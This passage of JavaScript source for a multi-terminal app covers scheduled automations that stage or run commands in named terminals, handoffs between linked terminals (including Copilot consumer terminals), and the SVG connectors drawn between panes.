    const time = document.createElement("time");
    time.className = "automation-activity-time";
    time.dateTime = entry.occurredAt;
    time.textContent = new Date(entry.occurredAt).toLocaleString([], { month: "short", day: "numeric", hour: "numeric", minute: "2-digit" });
    row.append(tone, copy, time);
    elements.automationActivityList.append(row);
  }
}

function switchAutomationView(view) {
  const normalized = ["routes", "activity"].includes(view) ? view : "schedules";
  state.automationStudio.view = normalized;
  for (const tab of elements.automationOverlay.querySelectorAll("[data-automation-view]")) {
    tab.setAttribute("aria-selected", String(tab.dataset.automationView === normalized));
  }
  for (const panel of elements.automationOverlay.querySelectorAll("[data-automation-panel]")) {
    panel.hidden = panel.dataset.automationPanel !== normalized;
  }
  if (normalized === "routes") renderAutomationRoutes();
  if (normalized === "activity") renderAutomationActivity();
}

function renderAutomationStudio() {
  elements.automationPause.setAttribute("aria-pressed", String(state.automations.paused));
  elements.automationPause.querySelector("span").textContent = state.automations.paused ? "Resume" : "Pause";
  elements.automationHistoryLimit.value = String(automationHistoryLimit());
  renderAutomationRuleList();
  renderAutomationRoutes();
  renderAutomationActivity();
  updateAutomationBadge();
}

function openAutomationStudio(view = "schedules") {
  closePalette();
  hideContextMenu();
  state.automationStudio.returnFocus = document.activeElement instanceof HTMLElement ? document.activeElement : null;
  elements.appShell.inert = true;
  elements.automationOverlay.hidden = false;
  switchAutomationView(view);
  renderAutomationStudio();
  window.requestAnimationFrame(() => elements.automationOverlay.classList.add("is-open"));
  elements.automationOverlay.querySelector(`[data-automation-view="${state.automationStudio.view}"]`)?.focus();
}

function closeAutomationStudio({ restoreFocus = true } = {}) {
  const returnFocus = state.automationStudio.returnFocus;
  state.automationStudio.returnFocus = null;
  elements.automationOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    if (elements.automationOverlay.classList.contains("is-open")) return;
    elements.automationOverlay.hidden = true;
    elements.appShell.inert = false;
    if (restoreFocus && returnFocus?.isConnected) returnFocus.focus({ preventScroll: true });
  }, 150);
}

function automationFocusableElements() {
  return [...elements.automationOverlay.querySelectorAll(
    'button:not([disabled]), input:not([disabled]), select:not([disabled]), [tabindex]:not([tabindex="-1"])'
  )].filter((element) => !element.hidden && element.offsetParent !== null);
}

function bindAutomationStudio() {
  if (!elements.automationOverlay) return;
  elements.automationToggle.addEventListener("click", () => openAutomationStudio());
  elements.automationClose.addEventListener("click", () => closeAutomationStudio());
  elements.automationPause.addEventListener("click", () => {
    state.automations.paused = !state.automations.paused;
    saveAutomationStore();
    renderAutomationStudio();
  });
  for (const tab of elements.automationOverlay.querySelectorAll("[data-automation-view]")) {
    tab.addEventListener("click", () => switchAutomationView(tab.dataset.automationView));
  }
  for (const button of elements.automationEditor.querySelectorAll("[data-schedule-mode]")) {
    button.addEventListener("click", () => setAutomationScheduleMode(button.dataset.scheduleMode));
  }
  for (const button of elements.automationDays.querySelectorAll("[data-day]")) {
    button.addEventListener("click", () => {
      button.setAttribute("aria-pressed", String(button.getAttribute("aria-pressed") !== "true"));
      updateAutomationPreview();
    });
  }
  elements.automationRuleList.addEventListener("click", (event) => {
    const edit = event.target.closest("[data-automation-edit]");
    const toggle = event.target.closest("[data-automation-toggle]");
    if (edit) openAutomationEditor(edit.dataset.automationEdit);
    if (toggle) toggleAutomationRule(toggle.dataset.automationToggle);
  });
  elements.automationRouteList.addEventListener("click", (event) => {
    const remove = event.target.closest("[data-automation-unlink]");
    if (remove) removeTerminalLink(remove.dataset.automationUnlink);
  });
  elements.automationRouteList.addEventListener("change", (event) => {
    const toggle = event.target.closest("[data-automation-route-toggle]");
    if (toggle) setTerminalLinkHandoffEnabled(toggle.dataset.automationRouteToggle, toggle.checked);
  });
  elements.automationSearch.addEventListener("input", renderAutomationRuleList);
  elements.automationNew.addEventListener("click", () => openAutomationEditor());
  elements.automationWelcomeNew.addEventListener("click", () => openAutomationEditor());
  elements.automationActionAdd.addEventListener("click", () => createAutomationActionRow());
  elements.automationEditor.addEventListener("submit", saveAutomationEditor);
  elements.automationEditor.addEventListener("input", updateAutomationPreview);
  elements.automationCancel.addEventListener("click", closeAutomationEditor);
  elements.automationDelete.addEventListener("click", deleteAutomationEditor);
  elements.automationRunNow.addEventListener("click", () => {
    const rule = readAutomationEditorRule(state.automations.rules.find((item) => item.id === state.automationStudio.editingId));
    if (rule) runAutomationRule(rule, { manual: true });
  });
  elements.automationHistoryLimit.addEventListener("change", () => {
    const value = Number(elements.automationHistoryLimit.value);
    state.settings.automationHistoryLimit = Number.isFinite(value) && value >= 0 ? Math.round(value) : defaultSettings.automationHistoryLimit;
    saveSettings();
    saveAutomationStore();
    renderAutomationActivity();
  });
  elements.automationActivityFilter.addEventListener("change", renderAutomationActivity);
  elements.automationActivityClear.addEventListener("click", () => {
    state.automations.history = [];
    saveAutomationStore();
    renderAutomationActivity();
  });
  elements.automationOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.automationOverlay) closeAutomationStudio();
  });
  elements.automationOverlay.addEventListener("keydown", (event) => {
    if (event.key === "Escape") {
      event.preventDefault();
      closeAutomationStudio();
      return;
    }
    if (event.key !== "Tab") return;
    const focusable = automationFocusableElements();
    if (!focusable.length) return;
    const first = focusable[0];
    const last = focusable[focusable.length - 1];
    if (event.shiftKey && document.activeElement === first) {
      event.preventDefault();
      last.focus();
    } else if (!event.shiftKey && document.activeElement === last) {
      event.preventDefault();
      first.focus();
    }
  });
  window.addEventListener("storage", (event) => {
    if (event.key !== AUTOMATIONS_STORAGE_KEY) return;
    state.automations = loadAutomationStore(automationHistoryLimit());
    renderAutomationStudio();
  });
  renderAutomationStudio();
  startAutomationRunner();
}

async function acquireAutomationRunner() {
  const response = await requestBridge({ type: "automationLease", action: "acquire", ttlMs: 4000 }, { timeout: 3000 });
  return response?.type === "automationLease" && response.acquired === true;
}

async function claimAutomationOccurrence(ruleId, dueAt) {
  const response = await requestBridge({
    type: "automationLease",
    action: "claimOccurrence",
    ruleId,
    dueAt: dueAt.toISOString()
  }, { timeout: 3000 });
  return response?.type === "automationLease" && response.occurrenceClaimed === true;
}

function releaseAutomationRunner() {
  sendBridge({ type: "automationLease", action: "release" });
}

function automationDueAt(rule) {
  const anchor = new Date(rule.lastRunAt || rule.createdAt);
  if (!Number.isFinite(anchor.getTime())) return null;
  return automationApi.nextScheduledAt(
    { ...rule, createdAt: anchor.toISOString(), lastRunAt: null },
    new Date(anchor.getTime() + 1)
  );
}

function resolveAutomationTerminal(targetName) {
  const normalized = automationApi.terminalName(targetName);
  const matches = [...state.terminals.values()].filter((terminal) => (
    terminal.status !== "exited" && terminal.status !== "error"
      && automationApi.terminalName(terminal.titleInput.value) === normalized
  ));
  if (matches.length === 1) return { terminal: matches[0] };
  return { error: matches.length > 1 ? `More than one live terminal is named ${targetName}` : `No live terminal is named ${targetName}` };
}

function pendingAutomationStage(terminal) {
  return state.automations.pendingStages.find((entry) => entry.targetId === terminal.id) || null;
}

function queueAutomationStage(terminal, command, rule, options = {}) {
  const payload = safeTerminalCommand(command);
  if (!payload) return false;
  const occurrenceKey = typeof options.occurrenceKey === "string" ? options.occurrenceKey.slice(0, 320) : "";
  const existing = occurrenceKey
    ? state.automations.pendingStages.find((entry) => entry.occurrenceKey === occurrenceKey)
    : null;
  if (existing) {
    saveAutomationStore();
    scheduleTerminalHandoffDelivery(terminal, 150);
    return true;
  }
  state.automations.pendingStages.push({
    automationId: rule.id,
    createdAt: new Date().toISOString(),
    id: createId(),
    occurrenceKey,
    payload,
    targetId: terminal.id,
    title: rule.name
  });
  saveAutomationStore();
  scheduleTerminalHandoffDelivery(terminal, 150);
  return true;
}

function runAutomationRule(rule, options = {}) {
  let queued = 0;
  for (const [actionIndex, action] of rule.actions.entries()) {
    const resolution = resolveAutomationTerminal(action.targetName);
    if (!resolution.terminal) {
      addAutomationHistory("blocked", rule.name, resolution.error, rule.id);
      continue;
    }
    const occurrenceKey = options.occurrenceAt ? `${rule.id}:${options.occurrenceAt}:${actionIndex}` : "";
    const accepted = action.submit
      ? queueAutomaticTerminalCommand(resolution.terminal, action.command, { occurrenceKey })
      : queueAutomationStage(resolution.terminal, action.command, rule, { occurrenceKey });
    if (accepted) {
      queued += 1;
      addAutomationHistory(
        "queued",
        rule.name,
        `${action.submit ? "Run" : "Stage"} in ${resolution.terminal.titleInput.value}`,
        rule.id
      );
    } else {
      addAutomationHistory("failed", rule.name, `Could not queue action for ${action.targetName}`, rule.id);
    }
  }
  if (options.manual && queued) toast(`Queued ${queued} automation action${queued === 1 ? "" : "s"}`, "success", 1800);
  return queued;
}

async function tickAutomationSchedules(now = new Date()) {
  const nowMs = now.getTime();
  if (state.automationRuntime.ticking) return false;
  state.automationRuntime.ticking = true;
  try {
    if (!await acquireAutomationRunner()) {
      state.automationRuntime.lastTickAt = nowMs;
      return false;
    }
    if (state.socketReady && nowMs - state.automationRuntime.lastMessageRefresh >= 5000) {
      state.automationRuntime.lastMessageRefresh = nowMs;
      requestTerminalMessages();
    }
    if (state.automations.paused) {
      state.automationRuntime.lastTickAt = nowMs;
      return false;
    }

    let changed = false;
    const dueRules = [];
    const wokeAfterGap = nowMs - state.automationRuntime.lastTickAt > 5000;
    for (const rule of state.automations.rules) {
      if (!rule.enabled) continue;
      const due = automationDueAt(rule);
      if (!due || due.getTime() > nowMs) continue;
      if (!await claimAutomationOccurrence(rule.id, due)) continue;
      const missedBeforeThisRenderer = due.getTime() < state.automationRuntime.lastTickAt;
      const shouldSkip = rule.trigger.catchUp !== "once" && (missedBeforeThisRenderer || (wokeAfterGap && due.getTime() < nowMs - 5000));
      dueRules.push({
        id: rule.id,
        occurrenceAt: due.toISOString(),
        runAt: (shouldSkip || wokeAfterGap ? now : due).toISOString(),
        skip: shouldSkip
      });
      changed = true;
    }
    if (changed) {
      for (const dueRule of dueRules) {
        const rule = state.automations.rules.find((item) => item.id === dueRule.id);
        if (!rule) continue;
        rule.lastRunAt = dueRule.runAt;
        rule.updatedAt = now.toISOString();
        if (dueRule.skip) addAutomationHistory("skipped", rule.name, "Missed occurrence skipped", rule.id);
        else runAutomationRule(rule, { occurrenceAt: dueRule.occurrenceAt });
      }
      renderAutomationRuleList();
    }
    state.automationRuntime.lastTickAt = nowMs;
    return changed;
  } finally {
    state.automationRuntime.ticking = false;
  }
}

function scheduleAutomationTick() {
  window.clearTimeout(state.automationRuntime.timer);
  state.automationRuntime.timer = window.setTimeout(async () => {
    state.automationRuntime.timer = 0;
    await tickAutomationSchedules(new Date());
    scheduleAutomationTick();
  }, 1000);
}

function startAutomationRunner() {
  state.automationRuntime.lastTickAt = Date.now();
  scheduleAutomationTick();
  document.addEventListener("visibilitychange", () => {
    if (!document.hidden) void tickAutomationSchedules(new Date());
  });
}

function stopAutomationRunner() {
  window.clearTimeout(state.automationRuntime.timer);
  state.automationRuntime.timer = 0;
  releaseAutomationRunner();
}

function terminalHandoffRows(terminal) {
  const buffer = terminal?.term?.buffer?.active;
  if (!buffer) return [];
  const maxChars = Math.max(1024, Number(state.settings.terminalMessageMaxKb) * 1024);
  const rows = [];
  let chars = 0;
  for (let row = buffer.length - 1; row >= 0 && chars < maxChars; row -= 1) {
    const line = readBufferLine(buffer, row);
    chars += line.length + 1;
    rows.unshift({ row, text: line });
  }
  return rows;
}

function scheduleTerminalHandoffScan(terminal, delay = AUTO_QUEUE_SETTLE_MS) {
  if (!terminal || terminal.status !== "live") return;
  window.clearTimeout(terminal.handoffScanTimer);
  terminal.handoffScanTimer = window.setTimeout(() => {
    terminal.handoffScanTimer = 0;
    scanTerminalHandoff(terminal);
  }, delay);
}

function linkedHandoffTarget(source, requestedName) {
  const normalizedName = automationApi.terminalName(requestedName);
  const matches = [...state.terminalLinks.values()]
    .filter((link) => link.handoffEnabled && link.sourceId === source.id)
    .map((link) => state.terminals.get(link.targetId))
    .filter((terminal) => terminal?.status === "live"
      && automationApi.terminalName(terminal.titleInput.value) === normalizedName);
  return matches.length === 1 ? matches[0] : null;
}

function uniqueHandoffTerminalTitle(source) {
  const base = `Handoff from ${source.titleInput.value || "Copilot"}`;
  let title = base;
  let index = 2;
  const existing = new Set([...state.terminals.values()].map((terminal) => automationApi.terminalName(terminal.titleInput.value)));
  while (existing.has(automationApi.terminalName(title))) title = `${base} ${index++}`;
  return title;
}

function openHandoffCopilotTerminal(source, payload) {
  return addTerminal({
    cwd: source.cwd,
    pageId: source.pageId,
    pendingCopilotYolo: true,
    pendingHandoff: { payload, requireCopilot: true, sourceId: source.id },
    reveal: true,
    shell: "pwsh",
    title: uniqueHandoffTerminalTitle(source)
  });
}

async function sendTerminalHandoff(source, target, payload) {
  if (source?.status !== "live" || target?.status !== "live") return false;
  const normalized = terminalMessaging.normalizeMessageRequest({
    delivery: "whenReady",
    kind: "task",
    path: "",
    persist: false,
    sourceId: source.id,
    status: "",
    targetId: target.id,
    text: payload
  }, Number(state.settings.terminalMessageMaxKb) * 1024);
  if (!normalized.ok) {
    addAutomationHistory("failed", "Handoff rejected", normalized.error);
    return false;
  }
  const response = await requestBridge({ type: "messageSend", ...normalized.value }, { timeout: 12000 });
  if (!response || response.type === "messageError") {
    addAutomationHistory("failed", "Handoff failed", response?.message || "Bridge unavailable");
    return false;
  }
  addAutomationHistory("queued", `${source.titleInput.value} → ${target.titleInput.value}`, "Waiting for the consumer prompt");
  scheduleTerminalHandoffDelivery(target, 150);
  return true;
}

function scanTerminalHandoff(terminal) {
  if (!terminal || state.automations.paused || terminal.status !== "live") return false;
  const readiness = terminalExecutionReadiness(terminal);
  if (readiness.mode !== "copilot" || !readiness.ready) return false;
  const handoff = automationApi.extractLatestHandoff(terminalHandoffRows(terminal), terminal.lastHandoffRow);
  if (!handoff) return false;
  terminal.lastHandoffRow = handoff.markerRow;

  if (!handoff.targetName) {
    openHandoffCopilotTerminal(terminal, handoff.payload);
    addAutomationHistory("queued", `New handoff from ${terminal.titleInput.value}`, "Opening a Copilot YOLO consumer");
    return true;
  }

  const target = linkedHandoffTarget(terminal, handoff.targetName);
  if (!target) {
    const detail = `No unique connected consumer named ${handoff.targetName}`;
    addAutomationHistory("blocked", `Handoff from ${terminal.titleInput.value}`, detail);
    toast(detail, "info", 3000);
    return false;
  }
  sendTerminalHandoff(terminal, target, handoff.payload);
  return true;
}

function readinessHandoffMessage(terminal) {
  return [...state.terminalMessages.values()]
    .filter((message) => message.delivery === "whenReady" && message.targetId === terminal.id && message.state === "pending")
    .sort((left, right) => String(left.createdAt).localeCompare(String(right.createdAt)))[0] || null;
}

function scheduleTerminalHandoffDelivery(terminal, delay = AUTO_QUEUE_SETTLE_MS) {
  window.clearTimeout(terminal?.handoffDeliveryTimer);
  if (!terminal || terminal.status !== "live" || (!readinessHandoffMessage(terminal) && !pendingAutomationStage(terminal))) return;
  terminal.handoffDeliveryTimer = window.setTimeout(() => {
    terminal.handoffDeliveryTimer = 0;
    dispatchTerminalHandoff(terminal);
  }, delay);
}

function scheduleAllTerminalHandoffDeliveries() {
  for (const terminal of state.terminals.values()) scheduleTerminalHandoffDelivery(terminal, 150);
}

function handoffPastePayload(payload, mode) {
  const value = String(payload || "")
    .replace(/\r\n?/g, "\n")
    .replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/g, "")
    .trim();
  if (!value) return "";
  return mode === "copilot" ? value : sanitizeTerminalCommand(value);
}

async function dispatchTerminalHandoff(terminal) {
  if (!terminal || terminal.handoffDispatching || state.automations.paused) return false;
  const message = readinessHandoffMessage(terminal);
  const scheduledStage = pendingAutomationStage(terminal);
  if (!message && !scheduledStage) return false;
  const readiness = terminalExecutionReadiness(terminal);
  if (terminal.handoffRequiresCopilot && readiness.mode !== "copilot") {
    scheduleTerminalHandoffDelivery(terminal, AUTO_QUEUE_SETTLE_MS);
    return false;
  }
  if (!readiness.ready) {
    scheduleTerminalHandoffDelivery(terminal, AUTO_QUEUE_SETTLE_MS);
    return false;
  }
  terminal.handoffDispatching = true;
  try {
    if (!message) {
      const payload = handoffPastePayload(scheduledStage.payload, readiness.mode);
      if (!payload || !pasteIntoSpecificTerminal(terminal, payload)) {
        addAutomationHistory("failed", scheduledStage.title, "The staged action could not be inserted", scheduledStage.automationId);
        return false;
      }
      state.automations.pendingStages = state.automations.pendingStages.filter((entry) => entry.id !== scheduledStage.id);
      saveAutomationStore();
      addAutomationHistory("staged", scheduledStage.title, `Staged in ${terminal.titleInput.value} without Enter`, scheduledStage.automationId);
      return true;
    }
    const claim = await requestBridge({ type: "messageAction", id: message.id, action: "claim" }, { timeout: 12000 });
    if (!claim || claim.type === "messageError" || claim.state !== "claimed") return false;
    const claimedMessage = normalizeIncomingTerminalMessage(claim.message || message);
    const payload = handoffPastePayload(terminalMessageContent(claimedMessage), readiness.mode);
    const pasteData = payload ? capturePasteForSpecificTerminal(terminal, payload) : "";
    if (!pasteData) {
      await requestBridge({ type: "messageAction", id: message.id, action: "release" }, { timeout: 12000 });
      addAutomationHistory("failed", `Handoff to ${terminal.titleInput.value}`, "The payload could not be staged");
      return false;
    }
    const delivered = await requestBridge({
      type: "messageAction",
      id: message.id,
      action: "deliver",
      data: pasteData
    }, { timeout: 12000 });
    if (!delivered || delivered.type === "messageError") {
      addAutomationHistory("failed", `Handoff to ${terminal.titleInput.value}`, "The bridge could not confirm atomic staging");
      return false;
    }
    state.terminalMessages.delete(message.id);
    terminal.handoffRequiresCopilot = false;
    updateTerminalMessageIndicators();
    addAutomationHistory("staged", `Handoff staged in ${terminal.titleInput.value}`, "Review the input and press Enter when ready");
    toast(`Handoff staged in ${terminal.titleInput.value}`, "success", 2200);
    return true;
  } finally {
    terminal.handoffDispatching = false;
    scheduleTerminalHandoffDelivery(terminal, 150);
  }
}

/* ---------------- Terminal messaging --------------- */

function terminalLinkKey(sourceId, targetId) {
  return `${sourceId}->${targetId}`;
}

function loadTerminalLinks() {
  try {
    const stored = localStorage.getItem("multiterm.terminalLinks") || "[]";
    if (stored.length > 1024 * 1024) return new Map();
    const raw = JSON.parse(stored);
    const links = new Map();
    for (const value of (Array.isArray(raw) ? raw : []).slice(0, 4096)) {
      if (!value || typeof value !== "object") continue;
      const sourceId = typeof value.sourceId === "string" ? value.sourceId : "";
      const targetId = typeof value.targetId === "string" ? value.targetId : "";
      if (!/^[a-zA-Z0-9_-]{8,80}$/.test(sourceId)
          || !/^[a-zA-Z0-9_-]{8,80}$/.test(targetId)
          || sourceId === targetId) continue;
      const link = {
        createdAt: typeof value.createdAt === "string" ? value.createdAt.slice(0, 64) : new Date().toISOString(),
        handoffEnabled: value.handoffEnabled === true,
        sourceId,
        sourceTitle: typeof value.sourceTitle === "string" ? value.sourceTitle.slice(0, 160) : "",
        targetId,
        targetTitle: typeof value.targetTitle === "string" ? value.targetTitle.slice(0, 160) : ""
      };
      links.set(terminalLinkKey(sourceId, targetId), link);
    }
    return links;
  } catch {
    return new Map();
  }
}

function saveTerminalLinks() {
  try {
    localStorage.setItem("multiterm.terminalLinks", JSON.stringify([...state.terminalLinks.values()]));
  } catch (error) {
    log.warn("messages", "Could not persist terminal links", { error: String(error) });
  }
}

function removeTerminalLinksForSession(id) {
  let changed = false;
  for (const [key, link] of state.terminalLinks) {
    if (link.sourceId !== id && link.targetId !== id) continue;
    state.terminalLinks.delete(key);
    changed = true;
  }
  if (changed) {
    saveTerminalLinks();
    updateTerminalConnectionViews();
  }
  return changed;
}

function pruneTerminalLinks() {
  let changed = false;
  for (const [key, link] of state.terminalLinks) {
    const source = state.terminals.get(link.sourceId);
    const target = state.terminals.get(link.targetId);
    if (source?.status === "live" && target?.status === "live") continue;
    state.terminalLinks.delete(key);
    changed = true;
  }
  if (changed) saveTerminalLinks();
  updateTerminalConnectionViews();
  return changed;
}

function addSelectedTerminalLink() {
  const sourceId = elements.messageSource.value;
  const targetId = elements.messageTarget.value;
  return addTerminalLink(sourceId, targetId, { handoffEnabled: false });
}

function addTerminalLink(sourceId, targetId, options = {}) {
  const source = state.terminals.get(sourceId);
  const target = state.terminals.get(targetId);
  if (source?.status !== "live" || target?.status !== "live" || sourceId === targetId) {
    toast("Choose two different live terminals to link", "error", 2400);
    return false;
  }
  const key = terminalLinkKey(sourceId, targetId);
  if (state.terminalLinks.has(key)) {
    const existing = state.terminalLinks.get(key);
    if (options.handoffEnabled === true && !existing.handoffEnabled) {
      existing.handoffEnabled = true;
      existing.sourceTitle = source.titleInput.value || existing.sourceTitle;
      existing.targetTitle = target.titleInput.value || existing.targetTitle;
      saveTerminalLinks();
      updateTerminalConnectionViews();
      updateMessageLinkAction();
      toast("Handoffs enabled for this route", "success", 1800);
      return true;
    }
    toast("Those terminals are already linked in that direction", "info", 2200);
    return false;
  }
  state.terminalLinks.set(key, {
    createdAt: new Date().toISOString(),
    handoffEnabled: options.handoffEnabled === true,
    sourceId,
    sourceTitle: source.titleInput.value || "Producer",
    targetId,
    targetTitle: target.titleInput.value || "Consumer"
  });
  saveTerminalLinks();
  updateTerminalConnectionViews();
  updateMessageLinkAction();
  toast(options.handoffEnabled ? "Handoff route created" : "Terminal link created", "success", 1600);
  return true;
}

function removeTerminalLink(key) {
  if (!state.terminalLinks.delete(key)) return false;
  saveTerminalLinks();
  updateTerminalConnectionViews();
  updateMessageLinkAction();
  toast("Terminal link removed", "info", 1600);
  return true;
}

function setTerminalLinkHandoffEnabled(key, enabled) {
  const link = state.terminalLinks.get(key);
  if (!link || link.handoffEnabled === enabled) return false;
  link.handoffEnabled = enabled;
  saveTerminalLinks();
  updateTerminalConnectionViews();
  toast(`Handoffs ${enabled ? "enabled" : "disabled"} for this route`, "success", 1600);
  return true;
}

function terminalHandoffGrip(terminal, type) {
  return terminal?.pane?.querySelector(`[data-handoff-grip="${type}"]`) || null;
}

function updateTerminalHandoffGripStates() {
  const sourceId = state.terminalConnections.linkSourceId;
  elements.host.classList.toggle("is-handoff-linking", Boolean(sourceId));
  for (const terminal of state.terminals.values()) {
    const output = terminalHandoffGrip(terminal, "output");
    const input = terminalHandoffGrip(terminal, "input");
    const hasRoute = [...state.terminalLinks.values()].some((link) => link.handoffEnabled && link.sourceId === terminal.id);
    output?.classList.toggle("has-route", hasRoute);
    output?.classList.toggle("is-linking", terminal.id === sourceId);
    output?.setAttribute("aria-pressed", String(terminal.id === sourceId));
    input?.classList.toggle("is-drop-target", terminal.id === state.terminalConnections.linkTargetId);
    input?.toggleAttribute("disabled", Boolean(sourceId && terminal.id === sourceId));
  }
}

function clearTerminalHandoffLinking() {
  state.terminalConnections.linkMoved = false;
  state.terminalConnections.linkPointerId = null;
  state.terminalConnections.linkPoint = null;
  state.terminalConnections.linkSourceId = null;
  state.terminalConnections.linkTargetId = null;
  updateTerminalHandoffGripStates();
  scheduleTerminalConnections();
}

function beginTerminalHandoffLinking(sourceId, event = null) {
  const source = state.terminals.get(sourceId);
  if (source?.status !== "live") {
    toast("The producer terminal must be live", "info", 1800);
    return false;
  }
  state.terminalConnections.linkMoved = false;
  state.terminalConnections.linkPointerId = Number.isInteger(event?.pointerId) ? event.pointerId : null;
  state.terminalConnections.linkPoint = event ? { x: event.clientX, y: event.clientY } : null;
  state.terminalConnections.linkSourceId = sourceId;
  state.terminalConnections.linkTargetId = null;
  updateTerminalHandoffGripStates();
  scheduleTerminalConnections();
  return true;
}

function handoffTargetAtPoint(x, y) {
  const grip = document.elementFromPoint(x, y)?.closest?.('[data-handoff-grip="input"]');
  const terminalId = grip?.closest(".terminal-pane")?.dataset.id;
  return terminalId && terminalId !== state.terminalConnections.linkSourceId
    && state.terminals.get(terminalId)?.status === "live"
    ? terminalId
    : null;
}

function completeTerminalHandoffLink(targetId) {
  const sourceId = state.terminalConnections.linkSourceId;
  if (!sourceId || !targetId || sourceId === targetId) return false;
  const created = addTerminalLink(sourceId, targetId, { handoffEnabled: true });
  clearTerminalHandoffLinking();
  return created;
}

function bindTerminalHandoffGrips(terminal) {
  const output = terminalHandoffGrip(terminal, "output");
  const input = terminalHandoffGrip(terminal, "input");
  if (!output || !input) return;
  output.addEventListener("pointerdown", (event) => {
    if (event.button !== 0) return;
    event.preventDefault();
    event.stopPropagation();
    beginTerminalHandoffLinking(terminal.id, event);
  });
  output.addEventListener("click", (event) => {
    event.preventDefault();
    event.stopPropagation();
    if (state.terminalConnections.linkSourceId === terminal.id) return;
    beginTerminalHandoffLinking(terminal.id);
  });
  input.addEventListener("click", (event) => {
    event.preventDefault();
    event.stopPropagation();
    completeTerminalHandoffLink(terminal.id);
  });
  updateTerminalHandoffGripStates();
}

function renderTerminalHandoffPreview(stageRect) {
  const source = state.terminals.get(state.terminalConnections.linkSourceId);
  const sourceGrip = terminalHandoffGrip(source, "output");
  const point = state.terminalConnections.linkPoint;
  if (!sourceGrip || !point) return false;
  const target = state.terminals.get(state.terminalConnections.linkTargetId);
  const targetGrip = terminalHandoffGrip(target, "input");
  const targetRect = targetGrip?.getBoundingClientRect() || {
    bottom: point.y + 1,
    left: point.x,
    right: point.x + 1,
    top: point.y
  };
  const geometry = connectorPathGeometry(sourceGrip.getBoundingClientRect(), targetRect, stageRect, 0, 0);
  elements.terminalConnectionPaths.append(createConnectionSvgElement("path", {
    class: "terminal-connector-path is-preview",
    d: geometry.d
  }));
  return true;
}

function terminalConnectionRoutes() {
  const routes = [...state.terminalLinks.entries()].map(([key, link]) => ({
    ...link,
    count: 0,
    key,
    type: "link"
  }));
  const pending = new Map();
  for (const message of state.terminalMessages.values()) {
    const key = terminalLinkKey(message.sourceId, message.targetId);
    const existing = pending.get(key);
    if (existing) {
      existing.count += 1;
    } else {
      pending.set(key, {
        count: 1,
        key,
        sourceId: message.sourceId,
        sourceTitle: message.sourceTitle,
        targetId: message.targetId,
        targetTitle: message.targetTitle,
        type: "pending"
      });
    }
  }
  return routes.concat([...pending.values()]);
}

function routesWithOffsets(routes) {
  const totals = new Map();
  for (const route of routes) totals.set(route.key, (totals.get(route.key) || 0) + 1);
  const indexes = new Map();
  return routes.map((route) => {
    const index = indexes.get(route.key) || 0;
    indexes.set(route.key, index + 1);
    return { ...route, offset: (index - (totals.get(route.key) - 1) / 2) * 12 };
  });
}

function connectorPathGeometry(sourceRect, targetRect, originRect, offset = 0, endpointInset = 0) {
  const sourceX = (sourceRect.left + sourceRect.right) / 2 - originRect.left;
  const sourceY = (sourceRect.top + sourceRect.bottom) / 2 - originRect.top;
  const targetX = (targetRect.left + targetRect.right) / 2 - originRect.left;
  const targetY = (targetRect.top + targetRect.bottom) / 2 - originRect.top;
  const deltaX = targetX - sourceX;
  const deltaY = targetY - sourceY;
  let startX;
  let startY;
  let endX;
  let endY;
  let control1X;
  let control1Y;
  let control2X;
  let control2Y;

  if (Math.abs(deltaX) >= Math.abs(deltaY)) {
    const direction = deltaX >= 0 ? 1 : -1;
    startX = (direction > 0 ? sourceRect.right - endpointInset : sourceRect.left + endpointInset) - originRect.left;
    endX = (direction > 0 ? targetRect.left + endpointInset : targetRect.right - endpointInset) - originRect.left;
    startY = sourceY + offset;
    endY = targetY + offset;
    const bend = Math.max(32, Math.abs(endX - startX) * 0.42);
    control1X = startX + direction * bend;
    control2X = endX - direction * bend;
    control1Y = startY;
    control2Y = endY;
  } else {
    const direction = deltaY >= 0 ? 1 : -1;
    startY = (direction > 0 ? sourceRect.bottom - endpointInset : sourceRect.top + endpointInset) - originRect.top;
    endY = (direction > 0 ? targetRect.top + endpointInset : targetRect.bottom - endpointInset) - originRect.top;
    startX = sourceX + offset;
    endX = targetX + offset;
    const bend = Math.max(32, Math.abs(endY - startY) * 0.42);
    control1Y = startY + direction * bend;
    control2Y = endY - direction * bend;
    control1X = startX;
    control2X = endX;
  }

  return {
    d: `M ${startX} ${startY} C ${control1X} ${control1Y}, ${control2X} ${control2Y}, ${endX} ${endY}`,
    midX: (startX + endX) / 2,
    midY: (startY + endY) / 2
  };
}

function createConnectionSvgElement(name, attributes = {}, text = "") {
  const element = document.createElementNS(elements.terminalConnectionsOverlay.namespaceURI, name);
  for (const [key, value] of Object.entries(attributes)) element.setAttribute(key, String(value));
  if (text) element.textContent = text;
  return element;
}

function appendDialogConnectorDefinitions(svg) {
  const definitions = createConnectionSvgElement("defs");
  const marker = (id, className, end, shape) => {
    const value = createConnectionSvgElement("marker", {
      id,
      class: className,
      viewBox: "0 0 10 10",
      refX: end ? 9 : 5,
      refY: 5,
      markerWidth: 10,
      markerHeight: 10,
      orient: "auto"
    });
    value.append(shape);
    definitions.append(value);
  };
  marker("dialogLinkStart", "connector-marker-link", false,
    createConnectionSvgElement("path", { d: "M5 1 9 5 5 9 1 5Z" }));
  marker("dialogLinkEnd", "connector-marker-link", true,
    createConnectionSvgElement("path", { d: "M1 1 9 5 1 9Z" }));
  marker("dialogPendingStart", "connector-marker-pending", false,
    createConnectionSvgElement("circle", { cx: 5, cy: 5, r: 3 }));
  marker("dialogPendingEnd", "connector-marker-pending", true,
    createConnectionSvgElement("path", { d: "M1 1 9 5 1 9" }));
  svg.append(definitions);
}

function routeTerminalTitle(id, fallback = "Terminal") {
  return state.terminals.get(id)?.titleInput.value || fallback || id;
}

function terminalConnectionRouteId(route) {
  return `${route.type}:${route.key}`;
}

function clearTerminalConnectorActionTimer() {
  window.clearTimeout(state.terminalConnections.actionHideTimer);
  state.terminalConnections.actionHideTimer = 0;
}

function positionTerminalConnectorAction(geometry) {
  const action = elements.terminalConnectorAction;
  if (!action || !elements.stage) return;
  const stageWidth = elements.stage.getBoundingClientRect().width;
  const halfWidth = Math.max(90, action.offsetWidth / 2);
  action.style.left = `${Math.max(halfWidth + 12, Math.min(stageWidth - halfWidth - 12, geometry.midX))}px`;
  action.style.top = `${geometry.midY}px`;
  action.dataset.side = geometry.midY < 72 ? "below" : "above";
}

function hideTerminalConnectorAction() {
  clearTerminalConnectorActionTimer();
  const action = elements.terminalConnectorAction;
  if (!action) return;
